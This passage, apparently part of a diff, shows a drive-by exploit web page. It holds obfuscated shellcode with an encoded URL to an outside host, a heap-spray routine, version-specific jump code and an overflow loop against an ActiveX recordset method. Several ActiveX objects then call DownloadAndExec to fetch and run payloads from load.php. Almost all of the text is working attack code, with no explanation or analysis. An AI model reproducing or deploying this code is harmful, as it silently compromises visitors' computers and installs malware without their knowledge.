pcOf53KzrNGCzQ3F4cf%ue7aa%ued85%uDWTxfPxh3pcOf53KzrNGCzQ3F4bDWTxfPxh3pcOf53KzrNGCzQ3F%uf7ba%uff07%uefef%u85ef%uDWTxfPxh3pcOf53KzrNGCzQ3F410%uffaa%uee85%uDWTxfPxh3pcOf53KzrNGCzQ3F4bDWTxfPxh3pcOf53KzrNGCzQ3F%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u03DWTxfPxh3pcOf53KzrNGCzQ3Fc%ub5eb%uDWTxfPxh3pcOf53KzrNGCzQ3F4bc%u0d35%ubd18%u0f10%uDWTxfPxh3pcOf53KzrNGCzQ3F4ba%uDWTxfPxh3pcOf53KzrNGCzQ3F403%ue792%ub2DWTxfPxh3pcOf53KzrNGCzQ3F4%ub9e3%u9cDWTxfPxh3pcOf53KzrNGCzQ3F4%uDWTxfPxh3pcOf53KzrNGCzQ3F4d3%uf19b%uec97%ub91c%u99DWTxfPxh3pcOf53KzrNGCzQ3F4%ueccf%udc1c%uaDWTxfPxh3pcOf53KzrNGCzQ3F2DWTxfPxh3pcOf53KzrNGCzQ3F%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u04DWTxfPxh3pcOf53KzrNGCzQ3F4%ub5DWTxfPxh3pcOf53KzrNGCzQ3F4%ueccb%u8932%ue3DWTxfPxh3pcOf53KzrNGCzQ3F4%uDWTxfPxh3pcOf53KzrNGCzQ3F4a4%uf3b5%u32ec%uebDWTxfPxh3pcOf53KzrNGCzQ3F4%uecDWTxfPxh3pcOf53KzrNGCzQ3F4%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1".replace(/DWTxfPxh3pcOf53KzrNGCzQ3F/ig, "6") + "%u7468%u7074%u2F3A%u362F%u2E37%u3132%u2E30%u3531%u312E%u3232%u662F%u2F70%u6F6C%u6461%u702E%u7068%u763F%u6C6D");
+
+var HeapRepairCode = unescape("%u9090%u9090%u186A%u645B%u038B%u408B%u8B30%u1840%u5805%u0001%u3300%u89D2%u8910%u0450%u5089%u8908%u0C50%uC083%u8928%u8900%u0440%uC083%u6608%u783D%u7C05%u8BF2%u81D8%u90C3%u0000%u8900%u3318%u83D2%u04C0%u1089%uC083%u8104%u80C3%u0000%u8900%u3318%u89C0%u8303%u04C3%u8166%u88FB%u7C1E%u8BF4%u81D3%u70EB%u001E%u6600%u338B%u8966%u4232%uC642%u0802%u6642%u328B%u3166%u4232%uC642%u1402%u6642%u328B%u3166%u4232%u6642%uC381%u0160%u1389%u5389%u8904%u891A%u045A%u9090");
+
+var part1 = '';
+var part2 = '';
+var partLen = 127;
+
+function PrepMem()
+{
+	var heapSprayToAddress = 0x05050505;
+	var payLoadCode = HeapRepairCode + Shellcode;
+	var heapBlockSize = 0x400000;
+	var payLoadSize = payLoadCode.length * 2;
+	var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
+	var spraySlide = unescape("%u9090%u9090");
+	spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+	heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
+	memory = new Array();
+
+	for (i=0;i<heapBlocks;i++)
+	{
+		memory[i] = spraySlide + payLoadCode;
+	}
+
+	function getSpraySlide(spraySlide, spraySlideSize)
+	{
+		while (spraySlide.length*2<spraySlideSize)
+		{
+			spraySlide += spraySlide;
+		}
+			spraySlide = spraySlide.substring(0,spraySlideSize/2);
+			return spraySlide;
+	}
+}
+
+
+function GetSystemVersion()
+{
+	var  ver = "";
+	ver += ScriptEngineMajorVersion();
+	ver += ScriptEngineMinorVersion();
+	ver += ScriptEngineBuildVersion();
+
+	if ( ver<568820 ){ return("preSP2"); }
+	else if ( ver<575730 ){ return("SP2"); }
+	else return (0);
+}
+
+function PrepJmpcode(sp)
+{
+	switch(sp)
+	{
+		case "preSP2":
+
+			var egg="";
+			egg+=unescape("%u0608%u0014");
+			egg+=unescape("%u0000%u0000");
+			egg+=unescape("%uF708%u0013");
+			egg+=unescape("%u0000%u0101");
+			egg+=unescape("%uFFFF%uFFFF");
+			egg+=unescape("%uFFFF%uFFFF");
+
+			part1+=unescape("%u0400%u0014");
+			part1+=unescape("%u320C%u77FC");
+			while (part1.length<partLen) {part1+=unescape("%u0505");}
+
+			while (part2.length<(partLen-egg.length)) {part2+=unescape("%uFFFF");}
+			part2+=egg;
+
+			break;
+
+		case "SP2":
+
+			var egg="";
+			egg+=unescape("%u0608%u0014");
+			egg+=unescape("%u0000%u0000");
+			egg+=unescape("%uF708%u0013");
+			egg+=unescape("%u0000%u0101");
+			egg+=unescape("%uFFFF%uFFFF");
+			egg+=unescape("%uFFFF%uFFFF");
+
+			part1+=unescape("%u0505%u0505");
+			part1+=unescape("%ue128%u75c7");
+			while (part1.length<partLen) {part1+=unescape("%uFFFF");}
+
+			while (part2.length<(partLen-egg.length)) {part2+=unescape("%uFFFF");}
+			part2+=egg;
+
+		break;
+	}
+}
+
+function Exploit()
+{
+	var arr=new Array();
+	var i=1;
+
+	while(i<500)
+	{
+		try
+		{
+			k=1;
+			while(k<500){ arr[k]=part1+part2; k++; }
+			obj.NextRecordset( part1+part2 );
+		}
+
+		catch(e){}
+
+		i++;
+	}
+}
+
+PrepMem();
+PrepJmpcode( GetSystemVersion() );
+Exploit();
+</script>
+</body>
+</html><object classid='clsid:8C875948-9C60-4381-9248-0DF180542D53' id='t1'></object>
+<object classid='clsid:BFC08CFF-C737-4433-BD5A-0EE7EFCFEE54' id='t2'></object>
+
+<script>
+try{ t2.DownloadAndExec('load.php?zango'); }catch(e){}
+try{ t1.DownloadAndExec('load.php?zango'); }catch(e){}
+</script><object id="msflexobj" classid="clsid:1DF951B1-8D40-4894-A04C-66AD824A0EEF" height="0" width="0"></object>
+<script>try { msflexobj.DownloadAndExecute("Bla","{11111111-1111-1111-1111-111000000000}",0,"load.php?msflex","1.exe"); } catch(e){}</script>
